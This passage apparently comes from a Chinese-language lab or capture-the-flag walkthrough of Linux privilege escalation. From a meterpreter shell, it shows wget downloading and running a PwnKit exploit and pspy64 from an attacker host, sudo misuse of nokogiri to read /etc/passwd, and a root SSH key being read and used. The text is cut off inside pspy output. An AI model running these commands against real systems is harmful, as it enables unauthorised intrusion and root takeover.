<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2525 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">wget http://192.168.2.9:8000/CVE-2021-4034-main.zip</span><br><span class="line">unzip CVE-2021-4034-main.zip</span><br><span class="line">cd CVE-2021-4034-main</span><br><span class="line">make</span><br><span class="line">./cve-2021-4034</span><br><span class="line">--2023-07-24 07:43:00--  http://192.168.2.9:8000/CVE-2021-4034-main.zip</span><br><span class="line">Connecting to 192.168.2.9:8000... failed: Network is unreachable.</span><br><span class="line">unzip:  cannot find or open CVE-2021-4034-main.zip, CVE-2021-4034-main.zip.zip or CVE-2021-4034-main.zip.ZIP.</span><br><span class="line">/bin/sh: 3: cd: can&#x27;t cd to CVE-2021-4034-main</span><br><span class="line">make: *** No targets specified and no makefile found.  Stop.</span><br><span class="line">/bin/sh: 5: ./cve-2021-4034: not found</span><br></pre></td></tr></table></figure>



<p>换个方法：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line"><span class="keyword">Process</span> <span class="number">2647</span> created.</span><br><span class="line">Channel <span class="number">0</span> created.</span><br><span class="line">sudo <span class="literal">-u</span> beloved /usr/local/bin/nokogiri <span class="literal">--help</span></span><br><span class="line">Nokogiri: an HTML, XML, SAX, and Reader parser</span><br><span class="line">Usage: nokogiri &lt;uri|path&gt; [<span class="type">options</span>]</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">  nokogiri https://www.ruby<span class="literal">-lang</span>.org/</span><br><span class="line">  nokogiri ./public/index.html</span><br><span class="line">  <span class="built_in">curl</span> <span class="literal">-s</span> http://www.nokogiri.org | nokogiri <span class="literal">-e</span><span class="string">&#x27;p $_.css(&quot;h1&quot;).length&#x27;</span></span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">        <span class="literal">--type</span> <span class="built_in">type</span>                  Parse as <span class="built_in">type</span>: xml or html (default: auto)</span><br><span class="line">    <span class="literal">-C</span> file                          Specifies initialization file to load (default /home/beloved/.nokogirirc)</span><br><span class="line">    <span class="literal">-E</span>, <span class="literal">--encoding</span> encoding          Read as encoding (default: none)</span><br><span class="line">    <span class="literal">-e</span> command                       Specifies script from command<span class="literal">-line</span>.</span><br><span class="line">        <span class="literal">--rng</span> &lt;uri|path&gt;             Validate <span class="keyword">using</span> this rng file.</span><br><span class="line">    -?, <span class="literal">--help</span>                       Show this message</span><br><span class="line">    <span class="literal">-v</span>, <span class="literal">--version</span>                    Show version</span><br><span class="line">sudo <span class="literal">-u</span> beloved /usr/local/bin/nokogiri /etc/passwd</span><br><span class="line">Your document is stored <span class="keyword">in</span> @doc...</span><br><span class="line"><span class="keyword">Switch</span> to inspect mode.</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> .bash_history</span><br><span class="line"><span class="built_in">clear</span></span><br><span class="line">id</span><br><span class="line"><span class="built_in">clear</span></span><br><span class="line"><span class="built_in">wget</span> http://<span class="number">192.168</span>.<span class="number">0.28</span>:<span class="number">8000</span>/pspy64</span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">wget</span> http://<span class="number">192.168</span>.<span class="number">0.28</span>:<span class="number">8000</span>/pspy64</span><br><span class="line">chmod +x *</span><br><span class="line"><span class="built_in">clear</span></span><br><span class="line">./pspy64 |grep <span class="string">&quot;UID=0&quot;</span></span><br><span class="line"><span class="built_in">clear</span></span><br><span class="line"><span class="built_in">cd</span> /opt</span><br><span class="line"><span class="built_in">clear</span></span><br><span class="line"><span class="built_in">ls</span> <span class="literal">-l</span></span><br><span class="line"><span class="built_in">cat</span> id_rsa</span><br><span class="line"><span class="built_in">clear</span></span><br><span class="line">touch test &amp;&amp; touch <span class="literal">--</span> <span class="literal">--reference</span>=test</span><br><span class="line"><span class="built_in">clear</span></span><br><span class="line">watch <span class="built_in">ls</span> <span class="literal">-l</span></span><br><span class="line"><span class="built_in">clear</span></span><br><span class="line"><span class="built_in">cat</span> id_rsa</span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">nano id_rsa</span><br><span class="line">chmod <span class="number">600</span> id_rsa</span><br><span class="line"><span class="built_in">clear</span></span><br><span class="line">ssh <span class="literal">-i</span> id_rsa root@localhost</span><br></pre></td></tr></table></figure>

<p>发现id_rsa可以连接root</p>
<p>上传pspy64</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">wget</span> http://<span class="number">192.168</span>.<span class="number">56.127</span>:<span class="number">8000</span>/pspy64</span><br><span class="line">chmod +x pspy64</span><br><span class="line">./pspy64</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">./pspy64    </span><br><span class="line">pspy - version: v1.<span class="number">2.1</span> - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     ██▓███    ██████  ██▓███ ▓██   ██▓</span><br><span class="line">    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒</span><br><span class="line">    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░</span><br><span class="line">    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░</span><br><span class="line">    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░</span><br><span class="line">    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒</span><br><span class="line">    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░</span><br><span class="line">    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  </span><br><span class="line">                   ░           ░ ░     </span><br><span class="line">                               ░ ░     </span><br><span class="line"></span><br><span class="line">Config: Printing events (colored=true): processes=true | file<span class="literal">-system-events</span>=false ||| Scanning <span class="keyword">for</span> processes every <span class="number">100</span>ms and on inotify events ||| Watching directories: [/<span class="type">usr</span> /<span class="type">tmp</span> /<span class="type">etc</span> /<span class="type">home</span> /<span class="type">var</span> /<span class="type">opt</span>] (recursive) | [] (non<span class="literal">-recursive</span>)</span><br><span class="line">Draining file system events due to startup...</span><br><span class="line">done</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">1000</span>  PID=<span class="number">2788</span>   | ./pspy64</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2774</span>   |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2750</span>   |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">1000</span>  PID=<span class="number">2672</span>   | /bin/bash</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2664</span>   |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">1000</span>  PID=<span class="number">2656</span>   | /usr/bin/ruby2.<span class="number">5</span> /usr/local/bin/nokogiri /etc/passwd</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2655</span>   | sudo <span class="literal">-u</span> beloved /usr/local/bin/nokogiri /etc/passwd</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">2648</span>   | /bin/sh</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">2647</span>   | sh <span class="literal">-c</span> /bin/sh  </span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">2521</span>   | python3 <span class="literal">-m</span> http.server</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">2367</span>   | /bin/sh</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">2150</span>   | /usr/sbin/apache2 <span class="literal">-k</span> <span class="built_in">start</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">1786</span>   | /usr/sbin/apache2 <span class="literal">-k</span> <span class="built_in">start</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">1784</span>   | /usr/sbin/apache2 <span class="literal">-k</span> <span class="built_in">start</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">1731</span>   | /usr/sbin/apache2 <span class="literal">-k</span> <span class="built_in">start</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">1727</span>   | /usr/sbin/apache2 <span class="literal">-k</span> <span class="built_in">start</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">1689</span>   | /usr/sbin/apache2 <span class="literal">-k</span> <span class="built_in">start</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">1681</span>   | /usr/sbin/apache2 <span class="literal">-k</span> <span class="built_in">start</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">1668</span>   | /usr/sbin/apache2 <span class="literal">-k</span> <span class="built_in">start</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">1646</span>   | /usr/sbin/apache2 <span class="literal">-k</span> <span class="built_in">start</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">33</span>    PID=<span class="number">1642</span>   | /usr/sbin/apache2 <span class="literal">-k</span> <span class="built_in">start</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">106</span>   PID=<span class="number">508</span>    | /usr/sbin/mysqld</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">455</span>    | /usr/sbin/apache2 <span class="literal">-k</span> <span class="built_in">start</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">396</span>    | /usr/bin/python3 /usr/share/unattended<span class="literal">-upgrades</span>/unattended<span class="literal">-upgrade-shutdown</span> <span class="literal">--wait-for-signal</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">387</span>    | /usr/sbin/sshd <span class="literal">-D</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">362</span>    | /sbin/agetty <span class="literal">-o</span> <span class="literal">-p</span> <span class="literal">--</span> \u <span class="literal">--noclear</span> tty1 linux</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">347</span>    | /sbin/dhclient <span class="literal">-4</span> <span class="literal">-v</span> <span class="literal">-i</span> <span class="literal">-pf</span> /run/dhclient.enp0s3.pid <span class="literal">-lf</span> /var/lib/dhcp/dhclient.enp0s3.leases <span class="literal">-I</span> <span class="literal">-df</span> /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3                                                                                                     </span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">327</span>    | /usr/sbin/cron <span class="operator">-f</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">104</span>   PID=<span class="number">322</span>    | /usr/bin/dbus<span class="literal">-daemon</span> <span class="literal">--system</span> <span class="literal">--address</span>=systemd: <span class="literal">--nofork</span> <span class="literal">--nopidfile</span> <span class="literal">--systemd-activation</span> <span class="literal">--syslog-only</span>                                                                                                                                              </span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">320</span>    | /usr/sbin/rsyslogd <span class="literal">-n</span> <span class="literal">-iNONE</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">319</span>    | /lib/systemd/systemd<span class="literal">-logind</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">308</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">306</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">101</span>   PID=<span class="number">285</span>    | /lib/systemd/systemd<span class="literal">-timesyncd</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">246</span>    | /lib/systemd/systemd<span class="literal">-udevd</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">225</span>    | /lib/systemd/systemd<span class="literal">-journald</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">194</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">193</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">191</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">160</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">131</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">130</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">128</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">123</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">121</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">119</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">117</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">110</span>    |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">61</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">52</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">51</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">50</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">32</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">29</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">28</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">27</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">26</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">25</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">24</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">23</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">22</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">21</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">20</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">19</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">18</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">17</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">16</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">15</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">14</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">12</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">11</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">10</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">9</span>      |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">8</span>      |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">6</span>      |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">4</span>      |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">3</span>      |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2</span>      |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">1</span>      | /sbin/init</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">18</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2795</span>   | /usr/sbin/CRON <span class="operator">-f</span></span><br><span 